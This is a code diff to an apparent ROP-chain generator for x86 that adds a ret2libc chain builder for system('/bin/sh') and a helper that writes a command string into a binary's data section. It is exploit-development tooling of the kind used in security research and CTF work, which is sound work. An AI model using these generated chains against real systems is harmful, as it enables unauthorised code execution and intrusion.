@@ -76,7 +76,7 @@ class RopChainX86(RopChain):
 
     @classmethod
     def availableGenerators(cls):
-        return [RopChainX86System, RopChainX86Mprotect, RopChainX86VirtualProtect]
+        return [RopChainX86System, RopChainX86SpawnShell, RopChainX86Mprotect, RopChainX86VirtualProtect]
 
     @classmethod
     def archs(self):
@@ -630,6 +630,17 @@ class RopChainX86(RopChain):
         else:
             raise RopChainError('Cannot create gadget for opcode: %s' % opcode)
 
+    def _addressWidth(self):
+        return 4
+
+    def _writeCmdToData(self, cmd, dataaddr):
+        # NUL-terminate and pad to a 4-byte boundary so the writewhatwhere
+        # gadget emits whole words without leaking past the string.
+        what = cmd + '\x00'
+        if len(what) % 4:
+            what += '\x00' * (4 - len(what) % 4)
+        return self._createWriteStringWhere(what, dataaddr)[0]
+
     def create(self):
         pass
 
@@ -743,6 +754,77 @@ class RopChainX86System(RopChainX86):
 
         chain += chain_tmp
         chain += 'print(rop)'
+        return chain
+
+
+class RopChainX86SpawnShell(RopChainX86):
+    """Generate a ret2libc ``system('/bin/sh')`` chain for x86 (cdecl).
+
+    cdecl passes arguments on the stack, so the call itself needs no
+    register-loading gadget; the chain is three words::
+
+        [ &system    ]   <- overwritten return address; system() runs
+        [ ret_after  ]   <- where system() returns (exit() / `ret` gadget / junk)
+        [ &"/bin/sh" ]   <- system()'s first argument
+
+    ``&system`` and ``&"/bin/sh"`` are resolved by the shared helpers in the
+    base class (supplied address > in-binary symbol/write > placeholder)."""
+
+    @classmethod
+    def usableTypes(self):
+        return (ELF, Raw)
+
+    @classmethod
+    def name(cls):
+        return 'spawn_shell'
+
+    def _resolveReturnAddress(self):
+        """The address system() returns to.  A resolvable exit() is cleanest; a
+        bare `ret` keeps the stack tidy; otherwise junk (the shell has already
+        spawned, so it rarely matters)."""
+        sym = self._findSymbolAddress('exit')
+        if sym is not None:
+            return self._rebaseLine(sym, 'return address: exit()')
+        try:
+            ret = self._searchOpcode('c3')
+            if ret:
+                idx = self._usedBinaries.index((ret.fileName, ret.section))
+                return 'rop += rebase_%d(%s) # return address: ret\n' % (idx, toHex(ret.lines[0][0], 4))
+        except RopChainError:
+            pass
+        return 'rop += p(0xdeadbeef) # return address (placeholder)\n'
+
+    def create(self, options=None):
+        options = options or {}
+        cmd = options.get('cmd') or '/bin/sh'
+        address = options.get('address')   # absolute libc system()
+        string = options.get('string')     # absolute &"/bin/sh"
+
+        self._printMessage('ROPchain Generator for system() on x86 (ret2libc):')
+        self._printMessage('  layout: [&system][ret][&cmd]  (cdecl, arg on stack)')
+
+        defs = ''
+        body = '\n'
+
+        # Resolve the "/bin/sh" pointer first (it may inject a .data write that
+        # must run before the call).
+        binsh_line, binsh_defs, write_text = self._resolveBinshPointer(cmd, string)
+        defs += binsh_defs
+        body += write_text
+
+        system_line, system_defs = self._resolveSystemAddress(address)
+        defs += system_defs
+
+        body += system_line
+        body += self._resolveReturnAddress()
+        body += binsh_line
+
+        chain = self._printHeader()
+        chain += self._printRebase()
+        chain += defs
+        chain += "rop = ''\n"
+        chain += body
+        chain += 'print(rop)\n'
         return chain
 
 
